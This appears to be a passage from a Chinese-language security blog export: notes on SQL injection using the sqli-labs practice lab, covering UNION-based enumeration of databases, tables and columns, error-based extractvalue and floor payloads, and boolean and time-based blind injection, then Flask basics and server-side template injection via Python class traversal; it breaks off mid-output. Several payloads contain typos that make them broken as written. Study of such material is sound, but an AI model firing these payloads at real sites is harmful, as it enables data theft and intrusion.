<h3 id="limit-限制输出数量"><a href="#limit-限制输出数量" class="headerlink" title="limit 限制输出数量"></a>limit 限制输出数量</h3><p><code>select * from users limit 1，3</code>这条语句的意思是查询user表的所有列，显示第2行道第4行的内容（由于第limit 0才是从第一行开始所以需要加1），</p>
<h3 id="and和or-与和或"><a href="#and和or-与和或" class="headerlink" title="and和or 与和或"></a>and和or 与和或</h3><p>and就是与<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> name<span class="operator">=</span>ctf;</span><br></pre></td></tr></table></figure><br>上面代码的意思为查询users表中id=1且name=ctf的那一行<br>or就是或<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> form users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> name<span class="operator">=</span>ctf;</span><br></pre></td></tr></table></figure><br>上面的语句就是输出满足id=1或者name=ctf的数据行</p>
<h4 id="利用and和or判断闭合关系-字符型或数子型"><a href="#利用and和or判断闭合关系-字符型或数子型" class="headerlink" title="利用and和or判断闭合关系(字符型或数子型)"></a>利用and和or判断闭合关系(字符型或数子型)</h4><h4 id="利用and和or提交万能密码"><a href="#利用and和or提交万能密码" class="headerlink" title="利用and和or提交万能密码"></a>利用and和or提交万能密码</h4><h2 id="常用函数z"><a href="#常用函数z" class="headerlink" title="常用函数z"></a>常用函数z</h2><h3 id="group-concat-多行整合成单行输出"><a href="#group-concat-多行整合成单行输出" class="headerlink" title="group_concat 多行整合成单行输出"></a>group_concat 多行整合成单行输出</h3><p>这个函数是将输出的多行转变为一行代码如下、<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(name（可多个列名）) <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><br>上面的代码可以将本该多行输出的name整合成一行输出</p>
<h3 id="select-database（）查询当前数据库名称"><a href="#select-database（）查询当前数据库名称" class="headerlink" title="select database（）查询当前数据库名称"></a>select database（）查询当前数据库名称</h3><h3 id="select-version（）查询当前数据库版本"><a href="#select-version（）查询当前数据库版本" class="headerlink" title="select version（）查询当前数据库版本"></a>select version（）查询当前数据库版本</h3><h2 id="sql注入基础（以下代码以sqli-labs的less1的代码举例）"><a href="#sql注入基础（以下代码以sqli-labs的less1的代码举例）" class="headerlink" title="sql注入基础（以下代码以sqli-labs的less1的代码举例）"></a>sql注入基础（以下代码以sqli-labs的less1的代码举例）</h2><h3 id="1-查询注入点"><a href="#1-查询注入点" class="headerlink" title="1.查询注入点"></a>1.查询注入点</h3><p>注入点就是可以实行注入的地方通常是一个访问数据库的连接。如sqli-labs的less1就是input the ID</p>
<h3 id="2-判断是字符型还是数字型注入"><a href="#2-判断是字符型还是数字型注入" class="headerlink" title="2.判断是字符型还是数字型注入"></a>2.判断是字符型还是数字型注入</h3><p>可以在网页中进行传值进行判断<br>有两种方法如<br>1.在sqli-labs的less1就需要输入<br><code>?id=1</code>查看回显后在<code>?id=2-1</code>查看回显再和<code>id=1</code>的回显内容进行比较若<br>想同为数字型不同为字符型<br>2.输入<code>?id=1</code>后输入<code>?id=1 and 1=2</code>若成功回显则为字符型，反之为数字型</p>
<h3 id="3-如果是字符型注入找到闭合方式"><a href="#3-如果是字符型注入找到闭合方式" class="headerlink" title="3.如果是字符型注入找到闭合方式"></a>3.如果是字符型注入找到闭合方式</h3><p>在我们进行传值id=1时由于是字符所以我们传入的值都将会在引号内所有出即使传入命令也将无法进行，所以我们需要闭合引号<br>传入<code>?id=1&#39;--+</code>—+的意义是将后面的语句注释如果不注释由于我们传入了一个<code>1&#39;</code>这会导致后面的引号落单导致报错所以需要注释掉后面的语句。<br>当然我们传入1’不一定会有效果因为字符的闭合方式有多种如下<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; &quot; &#x27;</span>) &quot;)</span><br></pre></td></tr></table></figure><br>我们需要自己进行尝试</p>
<h3 id="4-判断查询返回的列数"><a href="#4-判断查询返回的列数" class="headerlink" title="4.判断查询返回的列数"></a>4.判断查询返回的列数</h3><p>判断列数的原因为我们在注入时一般需要union来进行联合查询如以下代码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 union select * from 表名</span><br></pre></td></tr></table></figure><br>传入的语句就是<code>select * from 表名 where id=1 union select * from 表名;</code></p>
<p>union在进行查询时要保证查询的两表列数相同所以我们需要查询列数</p>
<p>查询列数需要用到我们之前的order by 和 gruop by<br>输入如下语句<code>?id=1&#39; order by 1</code><br>将order by后的数字进行替换尝试，来查询这个表的列数（group by也相同）</p>
<h3 id="5-查询回显位置"><a href="#5-查询回显位置" class="headerlink" title="5.查询回显位置"></a>5.查询回显位置</h3><p>查询回显位置时我们需要用的联合查询union<strong>注意：联合查询时所传出的值为两行但是网页一般只回显一行</strong>这时我们就需要使前一个查询输出空值或无法传出，这是我们就将id=-1这时我们就可以在屏幕上看见联合查询的第二条语句了<br>查询回显位置我们只需要输入如下代码<br><code>?id=-1&#39; union select 1,2,3--+</code><br>此时屏幕上就会出现数字的回显这时我们查看回显了什么数字，那些回显的数字就是回显位置，我们可以将那些数字替换成语句以此来进行查询</p>
<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p>在数据库中存在叫information_schema的数据库，这个数据库中存在一个叫schema_name的数据表，表里的schemata列中存储这所以数据库的名称那么我们就可以通过查询语句查询服务器中的所有库名代码如下<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure><br>注入语句中的写法如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure></p>
<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p>所有的表名存储在information_schema库的tables表的table_name列下,查询代码如下：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,gruop_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;</span><br></pre></td></tr></table></figure></p>
<h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><p>所有的列名都在information_schema库下的columns表的column_name列下<br>代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) form information_schea.columns where table_name=&#x27;表名&#x27;</span><br></pre></td></tr></table></figure></p>
<h1 id="extractvaalue-函数"><a href="#extractvaalue-函数" class="headerlink" title="extractvaalue()函数"></a>extractvaalue()函数</h1><p>extractvalue(xml_frag, xpath_expr)：从一个使用xpath语法的xml字符串中提取一个值。xml_frag：xml文档对象的名称，是一个string类型。<br>xpath_expr：使用xpath语法格式的路径。<br>这个函数是一种查询函数在报错注入时我们需要输入该函数的错误格式来使sql报错，这时我们就可以在报错里得到我们想要的信息<br>该注入语句适用于<br>以下是我们注入时的格式<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 union select 1,2,extracvalue(1,concat(0x7e,(select ~(~为查询语句))))</span><br></pre></td></tr></table></figure><br>其中0x7e为’~’的ascii码值 用concat来将~和查<br>询语句进行拼接使语句报错出查询的内容，但是报错的内容不能大于30字符所以我们需要用到substring来控制报错的输出<br><code>substring</code>可以对输出的字符量进行查询<br>下面是融入substring的输入语句<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,2,extractvalue(1,concat(0x7e,substring(select ~(~为查询语句))))--+</span><br></pre></td></tr></table></figure></p>
<h1 id="floor的报错注入"><a href="#floor的报错注入" class="headerlink" title="floor的报错注入"></a>floor的报错注入</h1><p>floor注入需要了解的函数<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">count(*)计数函数，用与计算不同分组的数量</span><br><span class="line">floor()将小数向下取证</span><br><span class="line">rand()生成0到1的小数</span><br><span class="line">concat_ws(1，2，3)用1做连接符来连接2和3</span><br></pre></td></tr></table></figure><br>先直接亮注入语句而后在做解释<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand(0)*2)) as a from information_schema.schemata group by a</span><br></pre></td></tr></table></figure><br>该语句是利用了concat_ws将查询语句与floor(rand(1)<em>2)拼接在一起，而后在将拼接后的所有语句命名为a在将其分组后利用count(</em>)计数。就是在计数时发生了报错<br>在利用concat进行拼接后查询到的字段中都会被拼接上-0或-1那么就会被分为两组进行计数<br>floor(rand(1)*2)这个语句所生成的数是固定，<br>而在计数时在第一次遇见字符（假设为a-0）时会进行二次计算在载入，而这就会导致载入的结果为下一个字段（假设为a-1），而后如果再次遇到a-0时就会载入下一个字段如果下一个字段为a-1那么就会造成出现两个a-1被载入那么就会发生报错从而实现报错注入<br>而我们也只需要对报错注入的查询语句进行替换就可以了</p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔盲注主要是利用注入时页面是否回显来判断真假，通过真假来判断查询内容<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length(str)返回函数内字符串的长度</span><br><span class="line">ascii(str)返回字符串最左端的字符的ascii</span><br><span class="line">substr(str,1,1)从第一位开始返回字符串1为</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))&gt;2;</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and ascii(substr((select database()),1,1))&gt;100</span><br></pre></td></tr></table></figure><br>只要将查询语句进行替换就可以查询其他内容</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注是用于屏幕不回显的情况<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep(延迟秒数)</span><br><span class="line">if(1,2,3)如果语句1正确执行语句2反之执行3</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3))</span><br></pre></td></tr></table></figure>
<p>同样只要对查询语句进行替换就可以查询其他内容。</p>
<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2>]]></content>
      <categories>
        <category>top10</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>ssti模板注入</title>
    <url>/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h1><p>Flask是一个Python编写的Web 微框架，让我们可以使用Python语言快速实现一个网站或Web服务。我们可以使用flask框架来快速搭建web</p>
<h2 id="flak框架基础代码"><a href="#flak框架基础代码" class="headerlink" title="flak框架基础代码"></a>flak框架基础代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask<span class="comment">#从flask模块里导入Flask类</span></span><br><span class="line">app = Flask(__name__)<span class="comment">#创建</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span><span class="comment">#路由规则</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/lll&#x27;</span></span>)</span><span class="comment">#静态路由</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello2</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello lll&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span></span>)</span><span class="comment">#动态路由</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello2</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello %s&quot;</span> % name</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/id/&lt;int:ID&gt;&#x27;</span></span>)</span><span class="comment">#变量为int型的动态路由</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID</span>(<span class="params">ID</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;you ID is %d&#x27;</span>%ID</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/num/&lt;float:num&gt;&#x27;</span></span>)</span><span class="comment">#float型动态路由</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;you num is %f&#x27;</span> % num</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">True</span>)<span class="comment">#开启debug，host端口全监控</span></span><br></pre></td></tr></table></figure>
<h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><h3 id="route路由"><a href="#route路由" class="headerlink" title="route路由"></a>route路由</h3><p>使用@app.route(‘/‘)来定义路由，路由分为静态路由与动态路由，静态路由如<code>@app.route(&#39;/lll&#39;)</code>只有搜索/lll才会触发<br>动态路由如<code>@app.route(&#39;/&lt;name&gt;&#39;)</code>通过&lt;&gt;在/后插入变量name只要访问/加上任意字符即可触发<br>当路由触发时会执行路由下定义好的函数，动态路由可以将路由的参数传到函数中如<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span></span>)</span><span class="comment">#动态路由</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello2</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello %s&quot;</span> % name</span><br></pre></td></tr></table></figure><br>会将/后的作为参数传送到hell2(name)函数的name里，这使用函数返回hello name，会直接返回到web里如下<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.png" class="" title="Alt text"></p>
<h3 id="http方法，redirect重定向，render-template"><a href="#http方法，redirect重定向，render-template" class="headerlink" title="http方法，redirect重定向，render_template"></a>http方法，redirect重定向，render_template</h3><p>GET和post方法<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)<span class="comment">#返回html相当于直接返回index.html这个模板</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span><span class="comment">#传参模式为post和get</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name=request.form[<span class="string">&#x27;lss&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;name&#x27;</span>, name1=name))<span class="comment">#若为post则使用redirect重定向配合url_for将其定向到/name下，传递参数name1=name name1为/name/&lt;name1&gt;的参数name1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name=request.args.get(<span class="string">&#x27;lss&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;name&#x27;</span>, name1=name))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/name/&lt;name1&gt;&#x27;</span></span>)</span><span class="comment">#接收redirect传来的参数name1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">name1</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello %s&quot;</span> %name1</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:5000/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>输入你的名字:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lss&quot;</span>/&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Redirect重定向相当于页面跳转</p>
<h2 id="flask模板"><a href="#flask模板" class="headerlink" title="flask模板"></a>flask模板</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ban</span>():</span><br><span class="line">    hello=<span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">    num=request.args.get(<span class="string">&#x27;num&#x27;</span>)<span class="comment">#获取get传的num参数</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,<span class="built_in">str</span>=hello,<span class="built_in">int</span>=num)<span class="comment">#将hello和num传入模板中</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个模板<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; str &#125;&#125;<span class="tag">&lt;<span class="name">P</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span>&#123;&#123; int &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面所书写的便是模板，模板就是我们个人写在templates文件夹下的html文件。所谓模板就是一个html文件占位符，可以直接将参数传入文件的占位符里。以达到动态显示的目的。<br>html文件内写的<code>&#123;&#123;int&#125;&#125;</code>就是占位符，我们可以利用render_template向html传入参数。传入的参数num是由get传入的我们传入的不同输出的也不同。</p>
<h2 id="flask模板漏洞"><a href="#flask模板漏洞" class="headerlink" title="flask模板漏洞"></a>flask模板漏洞</h2><p>模板注入的成因和之前学过的漏洞成因相似都是因为其过滤不严导致的漏洞。具体如下<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.png" class="" title="Alt text"><br>上图是使用上面的代码所运行的结果，利用的是render_templaste可以看出我们输入<code>1*1</code>输出还是<code>1*1</code>这是因为会先将内部的变量进行预渲染，使其变量成为单纯的字符串也就是转义了导致其失去了功能性，也就不存在ssti漏洞。<br>由于上面的代码的html文件中占位符都是由<code>&#123;&#123;&#125;&#125;</code>所包裹所以保持原样输出。<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/3.png" class="" title="Alt text"><br>这个代码我们可以看到其是使用render_template_string()这个函数与render_template()在功能上相差无几只是render_template_string()这个函数是使用字符串作为参数，将字符串作为模板渲染，而render_template()是将文件作为模板进行渲染。<br>由于其与render_template()无太大差别我们可以很轻松的看出其也木有ssti漏洞因为其占位符仍是由<code>&#123;&#123;&#125;&#125;</code>来包裹</p>
<p>下面为出现漏洞的代码<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/4.png" class="" title="Alt text"><br>我们可以看到其是使用<code>&#123;0&#125;加上format()</code>来进行直接插入的这样就导致了其不会进行预渲染，就会使其产生ssti漏洞。<br>当我们使用get传值传入<code>&#123;&#123;1*1&#125;&#125;</code>是就会返回1。我们输入的<code>1*1</code>被执行了。<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/6.png" class="" title="Alt text"><br>我们也可以输入JavaScript的指令，我们可以发现其也存在xss漏洞<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/5.png" class="" title="Alt text"><br>当然xss漏洞还不是造成危害最大的，这个ssti漏洞还会被利用为信息泄露，任意文件读取，RCE等漏洞，</p>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>Jinja2模板引擎中使用<code>&#123;&#123;&#125;&#125;</code>标识符包裹的内容会被解析成一个表达式，并且会在服务器端进行求值和渲染。如果使用<code>&#123;&#123;&#125;&#125;</code>中包含的是可执行的命令语句；此时这个命令语句会被执行；所以此时我们加上<code>&#123;&#123;&#125;&#125;</code>标识符的目的就是为了使得被<code>&#123;&#123;&#125;&#125;</code>包裹的内容当作变量来解析替换。</p>
<h2 id="父类与子类"><a href="#父类与子类" class="headerlink" title="父类与子类"></a>父类与子类</h2><p>所谓父类就是这个类的上一级而子类就是该类的下一级，所以类的父类不断的向上找父类最终会找到object这一类，我们就可以利用object的子类来进行操作。<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):<span class="keyword">pass</span></span><br><span class="line">c=B()</span><br><span class="line">d=D()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__)<span class="comment">#查找c的父类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__)<span class="comment">#查找c父类的父类</span></span><br><span class="line"><span class="built_in">print</span>(d.__class__.__mro__)<span class="comment">#不断查找c的父类直到object</span></span><br><span class="line"><span class="built_in">print</span>(d.__class__.__mro__[<span class="number">3</span>])<span class="comment">#选择查找父类结果的第4个</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__subclasses__())<span class="comment">#查找父类的父类下的所有子类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__subclasses__()[<span class="number">0</span>])<span class="comment">#选择第一个</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出结果</span><br><span class="line">&lt;class &#x27;__main__.A&#x27;&gt;</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;_contextvars.Token&#x27;&gt;, &lt;class &#x27;_contextvars.ContextVar&#x27;&gt;, &lt;class &#x27;_contextvars.Context&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;symtable entry&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;anext_awaitable&#x27;&gt;, &lt;class &#x27;async_generator_asend&#x27;&gt;, &lt;class &#x27;async_generator_athrow&#x27;&gt;, &lt;class &#x27;async_generator_wrapped_value&#x27;&gt;, &lt;class &#x27;_buffer_wrapper&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class 